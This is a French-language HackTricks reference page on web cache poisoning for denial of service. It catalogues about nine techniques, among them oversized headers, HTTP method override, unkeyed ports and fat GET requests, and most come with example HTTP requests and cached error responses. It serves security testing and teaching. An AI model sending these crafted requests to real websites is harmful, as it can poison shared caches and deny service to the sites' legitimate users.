# Poisonnement de cache pour DoS

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

{% hint style="danger" %}
Sur cette page, vous pouvez trouver diff√©rentes variations pour essayer de faire en sorte que le **serveur web r√©ponde avec des erreurs** aux requ√™tes qui sont **valides pour les serveurs de cache**
{% endhint %}

* **D√©passement de taille d'en-t√™te HTTP (HHO)**

Envoyez une requ√™te avec une taille d'en-t√™te plus grande que celle prise en charge par le serveur web mais plus petite que celle prise en charge par le serveur de cache. Le serveur web r√©pondra avec une r√©ponse 400 qui pourrait √™tre mise en cache :
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **Caract√®re m√©ta HTTP (HMC) et valeurs inattendues**

Envoyez un en-t√™te contenant des **caract√®res m√©ta nuisibles** tels que `\n` et `\r`. Pour que l'attaque fonctionne, vous devez d'abord contourner le cache.
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
Un en-t√™te mal configur√© pourrait simplement √™tre `\:` en tant qu'en-t√™te.

Cela pourrait √©galement fonctionner si des valeurs inattendues sont envoy√©es, comme un Content-Type: inattendu.
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **En-t√™te non cl√©**

Certains sites Web renverront un code d'√©tat d'erreur s'ils **voient certains en-t√™tes sp√©cifiques** dans la requ√™te comme avec l'en-t√™te _X-Amz-Website-Location-Redirect: someThing_:
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **Attaque de substitution de m√©thode HTTP (HMO)**

Si le serveur prend en charge le changement de m√©thode HTTP avec des en-t√™tes tels que `X-HTTP-Method-Override`, `X-HTTP-Method` ou `X-Method-Override`, il est possible de demander une page valide en changeant la m√©thode pour que le serveur ne la prenne pas en charge, ce qui entra√Æne une mauvaise r√©ponse mise en cache:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **Port non cl√©**

Si le port dans l'en-t√™te Host est refl√©t√© dans la r√©ponse et n'est pas inclus dans la cl√© de cache, il est possible de le rediriger vers un port inutilis√© :
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Long Redirect DoS**

Comme dans l'exemple suivant, x n'est pas mis en cache, donc un attaquant pourrait abuser du comportement de la r√©ponse de redirection pour envoyer une URL si grande que cela provoque une erreur. Ensuite, les personnes essayant d'acc√©der √† l'URL sans la cl√© x non mise en cache recevront la r√©ponse d'erreur:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **Normalisation de la casse de l'en-t√™te Host**

L'en-t√™te host devrait √™tre insensible √† la casse mais certains sites web s'attendent √† ce qu'il soit en minuscules, renvoyant une erreur s'il ne l'est pas :
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **Normalisation du chemin**

Certaines pages renverront des codes d'erreur en envoyant des donn√©es URLencod√©es dans le chemin, cependant, le serveur cache d√©codera l'URL du chemin et stockera la r√©ponse pour le chemin d√©cod√© :
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

Certains serveurs de cache, comme Cloudflare, ou les serveurs web, arr√™tent les requ√™tes GET avec un corps, donc cela pourrait √™tre abus√© pour mettre en cache une r√©ponse invalide:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## R√©f√©rences

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
